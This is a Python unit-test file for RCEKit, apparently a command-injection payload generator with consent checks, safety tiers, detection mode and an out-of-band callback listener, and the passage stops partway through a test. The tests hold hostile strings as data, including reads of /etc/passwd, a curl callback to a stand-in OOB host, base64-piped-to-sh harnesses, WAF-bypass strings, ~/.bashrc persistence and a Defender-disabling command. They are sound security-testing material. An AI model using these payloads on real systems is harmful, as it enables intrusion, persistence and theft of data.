"""Unit tests for RCEKit.

Run with: python -m unittest discover -s tests  (no third-party deps required)

These tests lock in the properties that matter to the real consumer of this
tool: every emitted payload should be unique and executable/decodable, the
removed obfuscation transforms must stay removed, and the safety filters and
detection mode must behave as documented.
"""

import ast
import base64
import collections
import inspect
import json
import os
import random
import re
import struct
import subprocess
import sys
import tempfile
import time
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import rcekit  # noqa: E402
from rcekit import (  # noqa: E402
    EvalExpr,
    FileBased,
    Observation,
    OOBListener,
    ParametricTime,
    PayloadRecord,
    Probe,
    RCEKit,
    ReflectedMath,
    Verdict,
    build_request_inputs,
    decode_response_body,
    parse_raw_request,
    partition_destructive,
)


def make_record(**overrides):
    """A minimal PayloadRecord for exercising the verification oracle."""
    base = dict(
        payload="; id", mode="exploit", category="basic_enum", environment="unix",
        context="raw", encoding="none", sink=None, indicator="", safety="intrusive",
        expected_channel="response", runner="sh",
    )
    base.update(overrides)
    return PayloadRecord(**base)


import contextlib  # noqa: E402
import shutil  # noqa: E402

# The shell the fake vulnerable sinks in this file run their injected input
# through. Every one of them models a POSIX command-injection point -- `echo
# <input> 2>&1`, `ping -c 1 <input>`, `sh -c "..."` -- and every probe RCEKit
# builds for them is POSIX: `$((a+b))`, `${IFS}`, a backtick substitution.
#
# `os.popen` does not run any of that on Windows. It runs cmd.exe, which echoes
# `$((466489+622859))` back as text, so the sink that the test says executes
# does not execute and the oracle correctly reports no execution. The tests then
# fail for a reason that has nothing to do with the code under test -- while the
# ones asserting a *negative* keep passing, for the wrong reason.
#
# So the shell is named rather than inherited from the platform. On Linux and
# macOS `shutil.which("sh")` is `/bin/sh` and nothing changes; on Windows it is
# the `sh` that ships with Git, which runs the same POSIX syntax.
POSIX_SHELL = shutil.which("sh")
if POSIX_SHELL is None:  # pragma: no cover - depends on the host, not the code
    print("[tests] WARNING: no POSIX `sh` on PATH. The command-injection sinks in "
          "this file will fall back to the platform shell, and every test that "
          "expects a POSIX sink to execute will fail. Install Git for Windows (it "
          "ships `sh`), or run the suite on Linux/macOS.")


class _ShellOutput:
    """The two methods the call sites use from an ``os.popen`` handle."""

    def __init__(self, text: str):
        self._text = text

    def read(self) -> str:
        return self._text

    def close(self):
        return None


def shell_writable_dir() -> str:
    """A throwaway directory both Python and a POSIX shell can name.

    ``tempfile.mkdtemp()`` hands back a backslash path on Windows, and a POSIX
    shell reads a backslash as an escape -- so a probe told to write into such
    a directory writes nothing the test can find, and a method that works
    reports no confirmation. Forward slashes are understood by both: Windows
    accepts a ``C:/...`` path at the API level, and ``sh`` passes it through
    unchanged. A no-op on Linux and macOS."""
    return Path(tempfile.mkdtemp()).as_posix()


def sh_popen(command: str):
    """``os.popen``, but guaranteed to be a POSIX shell.

    Returns stdout only, exactly as ``os.popen`` does: a `2>&1` or `2>/dev/null`
    in the command string is the *shell's* redirection and is left to do its own
    work, so a sink modelled as discarding stderr still discards it."""
    if POSIX_SHELL is None:  # pragma: no cover - see the warning above
        return os.popen(command)
    completed = subprocess.run([POSIX_SHELL, "-c", command],
                               capture_output=True, text=True, timeout=60)
    return _ShellOutput(completed.stdout)


@contextlib.contextmanager
def local_target(route):
    """Spin up a throwaway local HTTP target for detection tests. ``route`` is
    ``route(method, path, params, headers, body) -> (status, text)`` and stands
    in for the vulnerable app. Yields the base URL; tears the server down after.

    A route may return a third element, ``[(name, value), ...]``, to set response
    headers — that is how a sink whose output surfaces outside the body (a debug
    header, a Set-Cookie) is modelled.

    The body may be ``bytes`` instead of ``str``, and is then written verbatim.
    A compressed response is the case that needs it: the point of such a fixture
    is that the body does not *spell* the value it carries, which a str body
    encoded on the way out can never model."""
    import http.server
    import socketserver
    import threading
    import urllib.parse as up

    class Handler(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def _handle(self, method):
            parsed = up.urlparse(self.path)
            params = {k: v[0] for k, v in up.parse_qs(parsed.query).items()}
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode(errors="replace") if length else ""
            outcome = route(method, parsed.path, params, dict(self.headers), body)
            status, text = outcome[0], outcome[1]
            extra_headers = outcome[2] if len(outcome) > 2 else ()
            self.send_response(status)
            for name, value in extra_headers:
                self.send_header(name, value)
            self.end_headers()
            try:
                self.wfile.write(text if isinstance(text, bytes)
                                 else text.encode(errors="replace"))
            except BrokenPipeError:
                pass

        def do_GET(self):
            self._handle("GET")

        def do_POST(self):
            self._handle("POST")

    server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
    server.daemon_threads = True
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        yield f"http://127.0.0.1:{server.server_address[1]}"
    finally:
        server.shutdown()
        server.server_close()


def deep_json_nesting():
    """A JSON nesting depth that no *recursive* traversal can survive here.

    Deliberately not "the depth at which `json.loads` raises": that threshold
    moved between interpreters. CPython 3.12 raised the C recursion limit its
    scanner runs under, so a body 2000 levels deep parses fine on 3.12/3.13 and
    raises on 3.8-3.11. The defect was version-independent even so — where the
    parser survived, the recursive leaf walk hit the ordinary Python limit
    instead, and either way the exception escaped as a delivery failure.

    Keying off ``sys.getrecursionlimit()`` states the premise that actually
    holds everywhere: at this depth a recursive walk exceeds the interpreter's
    own limit, so a test using it cannot go quietly vacuous."""
    import sys
    return max(2000, sys.getrecursionlimit() * 2)


REPO_ROOT = Path(__file__).resolve().parent.parent
SCRIPT = REPO_ROOT / "rcekit.py"


class VersionTestCase(unittest.TestCase):
    def test_version_is_semver(self):
        self.assertRegex(rcekit.__version__, r"^\d+\.\d+\.\d+$")


class CLITestCase(unittest.TestCase):
    """Exercise the real CLI (argparse + main) via subprocess, not just the API."""

    def _run(self, *args, cwd=None):
        return subprocess.run(
            [sys.executable, str(SCRIPT), *args],
            cwd=str(cwd or REPO_ROOT), capture_output=True, text=True, timeout=120,
        )

    def test_help(self):
        result = self._run("--help")
        self.assertEqual(result.returncode, 0)
        self.assertIn("--verify-url", result.stdout)
        self.assertIn("--listen", result.stdout)

    def test_version_flag(self):
        result = self._run("--version")
        self.assertEqual(result.returncode, 0)
        self.assertRegex(result.stdout.strip(), r"\d+\.\d+\.\d+$")

    def test_exploit_requires_consent(self):
        result = self._run("--categories", "basic_enum", "--environments", "unix")
        self.assertIn("consent", (result.stdout + result.stderr).lower())

    def test_detection_only_writes_file(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "d.txt"
            result = self._run("--detection-only", "--environments", "unix", "-o", str(out))
            self.assertEqual(result.returncode, 0)
            self.assertTrue(out.exists() and out.read_text(encoding="utf-8").strip())

    def test_jsonl_records_are_valid(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "d.jsonl"
            self._run("--detection-only", "--environments", "unix",
                      "--output-format", "jsonl", "-o", str(out))
            lines = [l for l in out.read_text(encoding="utf-8").splitlines() if l.strip()]
            self.assertTrue(lines)
            for line in lines:
                json.loads(line)  # each record must be valid JSON

    def test_nuclei_export_produces_templates(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            result = self._run("--detection-only", "--environments", "unix",
                                "--output-format", "nuclei", "-o", str(out))
            self.assertEqual(result.returncode, 0)
            self.assertTrue(list((Path(tmp) / "run_nuclei").glob("*.yaml")))

    def test_target_profile_end_to_end(self):
        profile = REPO_ROOT / "profiles" / "quote-filtered-unix.json"
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "p.txt"
            result = self._run("--acknowledge-consent", "--target-profile", str(profile),
                               "--encodings", "none", "-o", str(out))
            self.assertEqual(result.returncode, 0)
            text = out.read_text(encoding="utf-8")
            self.assertTrue(text.strip())
            self.assertNotIn('"', text)  # profile denies quote characters


class OOBListenerTestCase(unittest.TestCase):
    def setUp(self):
        self.tokens = {"abc123token": {"payload": "; curl http://abc123token.oob.test/",
                                       "category": "oob", "context": "raw"}}
        self.listener = OOBListener(tokens=self.tokens)

    def test_correlates_token_from_host(self):
        hit = self.listener.record("http", "10.0.0.5", "abc123token.oob.test", "/")
        self.assertEqual(hit["token"], "abc123token")
        self.assertEqual(hit["payload"], "; curl http://abc123token.oob.test/")

    def test_correlates_token_from_path_exfil(self):
        hit = self.listener.record("http", "10.0.0.5", "", "/abc123token")
        self.assertEqual(hit["token"], "abc123token")

    def test_unknown_token_reported_without_payload(self):
        hit = self.listener.record("dns", "10.0.0.5", "unknownlabel.oob.test", "")
        self.assertIsNone(hit["payload"])
        self.assertEqual(hit["token"], "unknownlabel")

    def test_dns_query_is_parsed_and_answered(self):
        def encode(name):
            return b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\x00"
        query = b"\x12\x34" + b"\x01\x00" + b"\x00\x01" + b"\x00\x00" * 3 + encode("abc123token.oob.test") + b"\x00\x01\x00\x01"
        self.assertEqual(self.listener._parse_dns_qname(query), "abc123token.oob.test")
        response = self.listener._dns_response(query)
        self.assertEqual(response[:2], query[:2])       # same transaction id
        self.assertEqual(response[6:8], b"\x00\x01")     # one answer

    def test_live_http_callback_is_recorded(self):
        import urllib.request
        server = self.listener.start_http(0)
        try:
            port = server.server_address[1]
            req = urllib.request.Request(f"http://127.0.0.1:{port}/",
                                         headers={"Host": "abc123token.oob.test"})
            urllib.request.urlopen(req, timeout=3).read()
            import time
            time.sleep(0.1)
            self.assertTrue(any(h["payload"] for h in self.listener.hits))
        finally:
            server.shutdown()
            server.server_close()

    def test_invalid_answer_ip_is_rejected_at_construction(self):
        # An unusable answer IP used to raise inside the DNS thread on the first
        # query, killing it and silently dropping every callback that followed —
        # a false negative for the tool's whole OOB confirmation channel.
        for bad in ("bogus-ip", "999.1.1.1", "1.2.3", "1.2.3.4.5", "", "::1"):
            with self.subTest(answer_ip=bad):
                with self.assertRaises(ValueError):
                    OOBListener(answer_ip=bad)

    def test_valid_answer_ip_is_packed_into_the_answer(self):
        listener = OOBListener(tokens=self.tokens, answer_ip="10.11.12.13")
        query = (b"\x12\x34" + b"\x01\x00" + b"\x00\x01" + b"\x00\x00" * 3
                 + b"\x03abc\x04test\x00" + b"\x00\x01\x00\x01")
        self.assertTrue(listener._dns_response(query).endswith(bytes([10, 11, 12, 13])))

    def test_callback_is_recorded_even_when_the_answer_fails(self):
        # The hit is the signal this listener exists for, so a query we cannot
        # answer must still be reported, and must not take the thread down with
        # it. Forcing the response to fail proves both.
        import socket
        import time

        def explode(_data):
            raise RuntimeError("synthetic response failure")

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(("127.0.0.1", 0))
        port = sock.getsockname()[1]
        sock.close()

        listener = OOBListener(tokens=self.tokens)
        listener._dns_response = explode
        self.assertTrue(listener.start_dns(port))

        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            query = (b"\x12\x34" + b"\x01\x00" + b"\x00\x01" + b"\x00\x00" * 3
                     + b"\x0babc123token\x03oob\x04test\x00" + b"\x00\x01\x00\x01")
            for _ in range(2):
                client.sendto(query, ("127.0.0.1", port))
                time.sleep(0.3)
        finally:
            client.close()

        # Both callbacks recorded: the first did not kill the listening thread.
        correlated = [h for h in listener.hits if h["token"] == "abc123token"]
        self.assertEqual(len(correlated), 2, listener.hits)


class GeneratorTestCase(unittest.TestCase):
    def setUp(self):
        self.gen = RCEKit()

    def test_templates_loaded(self):
        self.assertTrue(self.gen.payload_categories, "payload categories should load")
        self.assertIn("basic_enum", self.gen.payload_categories)
        self.assertTrue(self.gen.detection_payloads, "detection payloads should load")

    def test_yaml_template_is_rejected_without_a_third_party_parser(self):
        # RCEKit is stdlib-only: a YAML template must fail with a clear error
        # rather than attempting to import a third-party YAML parser.
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "corpus.yaml"
            path.write_text("payload_categories: {}\n", encoding="utf-8")
            gen = RCEKit(template_path=path)
            self.assertFalse(gen.payload_categories)
            self.assertIsNotNone(gen.template_error)
            self.assertIn("YAML templates are not supported", gen.template_error)

    def test_removed_encodings_are_gone(self):
        removed = {"rot13", "rot13_then_base64", "insert_special_chars",
                   "xor_polymorphic", "chunk_shuffle"}
        self.assertEqual(removed & set(self.gen.encoding_methods), set())

    def test_no_garbage_or_non_executable_markers(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum"],
            selected_environments=["unix", "windows"],
        ))
        self.assertTrue(records)
        for rec in records:
            self.assertNotIn("XOR(", rec.payload)
            self.assertNotIn("shuffle::", rec.payload)

    def test_payloads_are_unique(self):
        payloads = [r.payload for r in self.gen.generate_payload_records(
            selected_categories=["basic_enum", "file_operations"],
            selected_environments=["unix"],
        )]
        self.assertEqual(len(payloads), len(set(payloads)), "no duplicate payloads")

    def test_random_case_only_for_case_insensitive_runners(self):
        records = [r for r in self.gen.generate_payload_records(
            selected_encodings=["random_case"],
        ) if r.encoding == "random_case"]
        self.assertTrue(records, "random_case should still apply somewhere")
        for rec in records:
            self.assertIn(rec.runner, self.gen.case_insensitive_runners)

    def test_encoding_compatibility_rules(self):
        self.assertFalse(self.gen._encoding_is_compatible("random_case", "sh"))
        self.assertFalse(self.gen._encoding_is_compatible("random_case", "python"))
        self.assertTrue(self.gen._encoding_is_compatible("random_case", "cmd"))
        self.assertTrue(self.gen._encoding_is_compatible("base64", "python"))
        # The self-contained decode-and-run harness is shell-only.
        self.assertTrue(self.gen._encoding_is_compatible("base64_decode_exec", "sh"))
        self.assertFalse(self.gen._encoding_is_compatible("base64_decode_exec", "python"))

    def test_default_encodings_exclude_decoder_required_blobs(self):
        encodings = {r.encoding for r in self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
            selected_contexts=["raw"],
        )}
        # Bare base64/hex blobs must not appear by default (they do nothing
        # unless the sink decodes them).
        self.assertFalse(encodings & self.gen.decoder_required_encodings)

    def test_base64_decode_exec_is_self_contained_and_runnable(self):
        records = [r for r in self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["base64_decode_exec"],
        )]
        self.assertTrue(records)
        for record in records:
            # Carries its own decoder pipeline, so it runs as-is on a shell.
            self.assertIn("|base64 -d|sh", record.payload)

    def test_decoder_required_encodings_are_opt_in(self):
        records = [r for r in self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["base64"],
        )]
        self.assertTrue(records)
        self.assertTrue(all(r.encoding == "base64" for r in records))

    def test_detection_mode_is_safe(self):
        records = list(self.gen.generate_payload_records(
            mode="detection", max_safety="safe",
        ))
        self.assertTrue(records)
        for rec in records:
            self.assertEqual(rec.mode, "detection")
            self.assertEqual(rec.safety, "safe")

    def test_max_safety_excludes_higher_tiers(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["persistence"],
            selected_environments=["unix"],
            max_safety="safe",
        ))
        self.assertEqual(records, [], "persistence is stateful and must be filtered at safe tier")

    def test_sleep_family_is_classified_blocking(self):
        blocking = ["sleep 5", "time.sleep(2)", "Thread.sleep(2000)",
                    "time.Sleep(1 * time.Second)", "pg_sleep(1)", "SELECT pg_sleep(1);",
                    "Start-Sleep -Seconds 3", "select(undef, undef, undef, 1)", "timeout /T 5"]
        for payload in blocking:
            self.assertTrue(self.gen._is_blocking(payload), payload)
        for payload in ["id", "cat /etc/passwd", "setTimeout(()=>x,1000)", "whoami"]:
            self.assertFalse(self.gen._is_blocking(payload), payload)

    def test_blocking_excluded_by_default(self):
        records = list(self.gen.generate_payload_records(
            mode="detection", include_blocking=False, max_safety="stateful",
        ))
        self.assertTrue(all(not r.blocking for r in records))

    def test_watermark_embedded_when_token_present(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum"],
            selected_environments=["unix"],
            selected_contexts=["raw"],
            selected_encodings=["none"],
            watermark_token="TESTTOKN",
        ))
        self.assertTrue(records)
        self.assertTrue(any("TESTTOKN" in r.payload for r in records))

    def test_no_watermark_by_default(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum", "code_execution"],
            selected_environments=["unix", "python"],
        ))
        self.assertTrue(records)
        self.assertFalse(any("RCEKit-ID" in r.payload for r in records))

    def test_code_payloads_not_quote_wrapped(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"],
            selected_environments=["python"],
            selected_contexts=["raw"],
            selected_encodings=["none"],
        ))
        payloads = [r.payload for r in records]
        # The raw snippet must appear executable, never wrapped into an inert
        # string literal such as "os.system('whoami')".
        self.assertIn("os.system('whoami')", payloads)
        self.assertNotIn('"os.system(\'whoami\')"', payloads)

    def test_ssti_delimiters_preserved(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"],
            selected_environments=["python", "java"],
            selected_contexts=["raw"],
            selected_encodings=["none"],
        ))
        payloads = [r.payload for r in records]
        # SSTI payloads must keep their template delimiters intact.
        self.assertIn("{{7*7}}", payloads)
        self.assertTrue(any(p.startswith("${") for p in payloads))

    def test_waf_bypass_payloads_are_quote_free(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["waf_bypass"],
            selected_environments=["unix"],
            selected_contexts=["raw"],
            selected_encodings=["none"],
        ))
        self.assertTrue(records)
        self.assertTrue(any("${IFS}" in r.payload for r in records))
        # The whole point is command injection without quote characters.
        for record in records:
            self.assertNotIn('"', record.payload)
            self.assertNotIn("'", record.payload)

    def test_oob_requires_domain_and_gets_unique_tokens(self):
        # Without an OOB domain, {oob} payloads are dropped entirely.
        without = list(self.gen.generate_payload_records(
            selected_categories=["oob"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["none"],
        ))
        self.assertEqual(without, [])

        # With a domain, each record carries a unique correlation token/host.
        with_dom = list(self.gen.generate_payload_records(
            selected_categories=["oob"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["none"],
            oob_domain="oast.example.com",
        ))
        self.assertTrue(with_dom)
        tokens = [r.token for r in with_dom]
        self.assertTrue(all(tokens), "every OOB record must carry a token")
        self.assertEqual(len(tokens), len(set(tokens)), "OOB tokens must be unique")
        for record in with_dom:
            self.assertIn(record.oob_host, record.payload)
            self.assertTrue(record.oob_host.endswith(".oast.example.com"))
            self.assertEqual(record.expected_channel, "interactsh")

    def test_command_payloads_carry_match_signatures(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum", "file_operations"],
            selected_environments=["unix"], selected_contexts=["raw"],
            selected_encodings=["none"],
        ))
        by_payload = {r.payload: r.match for r in records}
        # `id` output is a recognisable uid= line; /etc/passwd starts with root:.
        self.assertEqual(by_payload.get("; id"), r"uid=\d+")
        self.assertTrue(any(m and "root:" in m for m in by_payload.values()))
        # A signature must actually match real output.
        self.assertRegex("uid=0(root) gid=0(root)", by_payload["; id"])

    def test_canary_match_is_the_token_and_oob_has_none(self):
        records = list(self.gen.generate_payload_records(
            mode="detection", selected_environments=["unix"], selected_contexts=["raw"],
            selected_encodings=["none"], oob_domain="x.oast.pro",
            max_safety="stateful", include_blocking=True,
        ))
        canaries = [r for r in records if r.token and r.expected_channel in {"response", "stderr"}]
        self.assertTrue(canaries)
        for record in canaries:
            self.assertEqual(record.match, record.token)
        oob = [r for r in records if r.expected_channel == "interactsh"]
        self.assertTrue(oob)
        self.assertTrue(all(r.match is None for r in oob))

    def test_destructive_flagging(self):
        self.assertTrue(self.gen._is_destructive("echo x >> ~/.bashrc", "persistence"))
        self.assertTrue(self.gen._is_destructive("rm -rf /tmp/x", "file_operations"))
        self.assertTrue(self.gen._is_destructive("Set-MpPreference -DisableRealtimeMonitoring $true", "persistence"))
        self.assertFalse(self.gen._is_destructive("id", "basic_enum"))
        self.assertFalse(self.gen._is_destructive("cat /etc/passwd", "file_operations"))
        # The record field is populated from the payload/category.
        records = list(self.gen.generate_payload_records(
            selected_categories=["persistence"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["none"], max_safety="stateful",
        ))
        self.assertTrue(records)
        self.assertTrue(all(r.destructive for r in records))

    def test_mongodb_and_graphql_sinks_present(self):
        mongo = [r for r in self.gen.generate_payload_records(
            selected_categories=["nosql_injection"], selected_environments=["mongodb"],
            selected_contexts=["raw"], selected_encodings=["none"],
        )]
        self.assertTrue(mongo)
        self.assertTrue(all(r.environment == "mongodb" for r in mongo))
        self.assertTrue(any("$where" in r.payload for r in mongo))
        self.assertTrue(any("$function" in r.payload for r in mongo))

        gql = [r for r in self.gen.generate_payload_records(
            selected_categories=["graphql_injection"], selected_environments=["graphql"],
            selected_contexts=["raw"], selected_encodings=["none"],
        )]
        self.assertTrue(gql)
        self.assertTrue(any("__schema" in r.payload for r in gql))
        # GraphQL / Mongo payloads must not be prefixed with shell separators.
        self.assertTrue(all(not r.payload.startswith((";", "|", "&")) for r in mongo + gql))

    def test_java_expression_sinks_added(self):
        sinks = {
            r.sink for r in self.gen.generate_payload_records(
                selected_categories=["code_execution"], selected_environments=["java"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
        }
        self.assertTrue({"spel", "ognl", "groovy"}.issubset(sinks))

    def test_json_context_escapes_payload(self):
        # A Java payload uses double quotes, which must be escaped to stay a
        # valid JSON string value.
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"], selected_environments=["java"],
            selected_contexts=["json"], selected_encodings=["none"],
        ))
        self.assertTrue(records)
        for record in records:
            # Each payload must parse as the body of a JSON string.
            json.loads('"' + record.payload + '"')
        self.assertTrue(any('\\"' in r.payload for r in records))

    def test_xml_context_entity_escapes(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"], selected_environments=["java"],
            selected_contexts=["xml"], selected_encodings=["none"],
        ))
        self.assertTrue(any("&quot;" in r.payload for r in records))
        self.assertFalse(any('"' in r.payload for r in records))

    def test_transport_context_carries_any_environment(self):
        # A serialization context is compatible with a non-shell environment.
        records = list(self.gen.generate_payload_records(
            selected_categories=["code_execution"], selected_environments=["python"],
            selected_contexts=["yaml"], selected_encodings=["none"],
        ))
        self.assertTrue(records)
        self.assertTrue(all(r.context == "yaml" for r in records))

    def test_shell_quoted_context_breaks_out_cleanly(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
            selected_contexts=["shell_single_quoted"], selected_encodings=["none"],
        ))
        self.assertTrue(records)
        for record in records:
            self.assertTrue(record.payload.startswith("'; "))
            self.assertNotRegex(record.payload, r";\s*;")  # no ";;" syntax error
        # Shell-quoted contexts are not offered to non-shell environments.
        self.assertFalse(self.gen._is_context_compatible("shell_single_quoted", "python", True))

    def test_default_contexts_exclude_transport_contexts(self):
        # A default run (no --contexts) must not silently include the richer
        # opt-in contexts, keeping output size and behaviour stable.
        contexts = {r.context for r in self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
        )}
        self.assertNotIn("json", contexts)
        self.assertNotIn("shell_single_quoted", contexts)

    def test_sink_needs_separator_keeps_only_breakouts(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["none"],
        ))
        filtered = list(self.gen._filter_by_profile(records, needs_separator=True))
        self.assertTrue(filtered)
        self.assertLess(len(filtered), len(records))
        # The bare command (no separator) can't fire mid-command; it must be gone.
        self.assertIn("id", [r.payload for r in records])
        self.assertNotIn("id", [r.payload for r in filtered])
        # A separator-led variant must survive.
        self.assertIn("; id", [r.payload for r in filtered])

    def test_sink_needs_separator_judges_encoded_payloads_by_canonical_form(self):
        # Separator-validity must be decided on the pre-encoding payload, not the
        # final string: a url-encoded bare command still can't fire mid-command,
        # while a url-encoded break-out still can.
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["none", "url_encode"],
        ))
        filtered = list(self.gen._filter_by_profile(records, needs_separator=True))
        # Encoded bare command (decodes to plain "id") cannot break out -> dropped.
        self.assertIn("id", [r.payload for r in records])
        self.assertNotIn("id", [r.payload for r in filtered])
        # Encoded break-out (";" percent-escaped) is still a valid separator once
        # the sink decodes it, so it must survive even though its literal form no
        # longer starts with a separator.
        self.assertIn("%3B%20id", [r.payload for r in records])
        self.assertIn("%3B%20id", [r.payload for r in filtered])
        # Nothing that survives should be an encoded bare command.
        for record in filtered:
            self.assertTrue(record.separator_led)

    def test_sink_blind_keeps_only_out_of_band_confirmable(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum", "oob"], selected_environments=["unix"],
            selected_contexts=["raw"], selected_encodings=["none"],
            oob_domain="x.oast.pro", max_safety="stateful", include_blocking=True,
        ))
        filtered = list(self.gen._filter_by_profile(records, blind=True))
        self.assertTrue(filtered)
        for record in filtered:
            self.assertTrue(record.blocking or record.oob_host or record.expected_channel == "interactsh")
        # Plain reflected `echo`/`id` payloads (response-only) must be dropped.
        self.assertFalse(any(r.payload == "; id" for r in filtered))

    def test_profile_filter_drops_denied_chars_and_long_payloads(self):
        records = list(self.gen.generate_payload_records(
            selected_categories=["basic_enum", "file_operations", "waf_bypass"],
            selected_environments=["unix"], selected_contexts=["raw"],
            selected_encodings=["none"],
        ))
        filtered = list(self.gen._filter_by_profile(records, deny_chars="'\"", max_length=40))
        self.assertTrue(filtered)
        self.assertLess(len(filtered), len(records), "the filter must actually drop something")
        for record in filtered:
            self.assertNotIn('"', record.payload)
            self.assertNotIn("'", record.payload)
            self.assertLessEqual(len(record.payload), 40)
        # A quote-free WAF-bypass payload should survive the quote filter.
        self.assertTrue(any("${IFS}" in r.payload for r in filtered))

    def test_target_profile_file_applies_end_to_end(self):
        profile = Path(__file__).resolve().parent.parent / "profiles" / "quote-filtered-unix.json"
        self.assertTrue(profile.exists(), "example profile should ship with the repo")
        import json
        spec = json.loads(profile.read_text(encoding="utf-8"))
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "p.txt"
            self.gen.save_payloads_to_file(
                file_path=str(out),
                deny_chars="".join(spec["deny_chars"]),
                max_length=spec["max_length"],
                selected_environments=spec["environments"],
                selected_contexts=spec["contexts"],
                selected_categories=spec["categories"],
                selected_encodings=spec["encodings"],
                oob_domain=spec.get("oob_domain"),
            )
            lines = out.read_text(encoding="utf-8").splitlines()
            self.assertTrue(lines)
            for line in lines:
                self.assertNotIn('"', line)
                self.assertNotIn("'", line)
                self.assertLessEqual(len(line), spec["max_length"])

    def test_burp_export_writes_context_wordlists(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            count = self.gen.save_payloads_to_file(
                file_path=str(out), output_format="burp",
                selected_categories=["basic_enum"], selected_environments=["unix"],
            )
            self.assertGreater(count, 0)
            outdir = Path(tmp) / "run_burp"
            self.assertTrue((outdir / "payloads-all.txt").exists())
            self.assertTrue(any(outdir.glob("payloads-*.txt")))
            # Without a target profile Burp users set positions themselves, so no
            # generic placeholder request is fabricated.
            self.assertFalse((outdir / "request.txt").exists())

    def test_wordlist_export_honours_selected_encodings(self):
        # The exporter must not silently drop encoded variants: an encoding the
        # tools cannot reproduce (or simply one the user asked for) belongs in the
        # wordlist as a literal line.
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            self.gen.save_payloads_to_file(
                file_path=str(out), output_format="burp",
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none", "base64_decode_exec"],
            )
            allp = (Path(tmp) / "run_burp" / "payloads-all.txt").read_text(encoding="utf-8")
            self.assertIn("; id", allp)
            self.assertTrue(any("base64 -d" in line for line in allp.splitlines()),
                            "self-contained encoded variants must survive into the wordlist")

    def test_ffuf_export_with_profile_is_runnable(self):
        request = {"url": "https://target.example/api/v1/lookup", "method": "POST",
                   "headers": {"Content-Type": "application/json"},
                   "body": '{"host": "FUZZ"}'}
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            self.gen.save_payloads_to_file(
                file_path=str(out), output_format="ffuf", request_template=request,
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
            outdir = Path(tmp) / "run_ffuf"
            self.assertTrue((outdir / "payloads-all.txt").exists())
            req = (outdir / "request.txt").read_text(encoding="utf-8")
            # A real FUZZ marker, not Burp's section sign.
            self.assertIn('{"host": "FUZZ"}', req)
            self.assertNotIn("\xa7", req)
            run = (outdir / "run.sh").read_text(encoding="utf-8")
            self.assertIn("ffuf -request request.txt -w payloads-all.txt", run)
            self.assertIn("-request-proto https", run)

    def test_ffuf_export_without_profile_writes_wordlists_only(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            count = self.gen.save_payloads_to_file(
                file_path=str(out), output_format="ffuf",
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["raw"], selected_encodings=["none"],
            )
            self.assertGreater(count, 0)
            outdir = Path(tmp) / "run_ffuf"
            self.assertTrue((outdir / "payloads-all.txt").exists())
            # No injection point -> no fabricated request or runner.
            self.assertFalse((outdir / "request.txt").exists())
            self.assertFalse((outdir / "run.sh").exists())

    def test_ffuf_export_path_only_profile_is_not_runnable(self):
        # A path-only URL cannot name the target host, so ffuf has nothing to run
        # against -> wordlists only, no misleading request.txt/run.sh pointing at
        # a placeholder host.
        request = {"url": "/api/v1/lookup", "method": "POST",
                   "headers": {"Content-Type": "application/json"},
                   "body": '{"host": "FUZZ"}'}
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "run.txt"
            self.gen.save_payloads_to_file(
                file_path=str(out), output_format="ffuf", request_template=request,
                selected_categories=["basic_enum"], selected_environments=["unix"],
                selected_contexts=["json"], selected_encodings=["none"],
            )
            outdir = Path(tmp) / "run_ffuf"
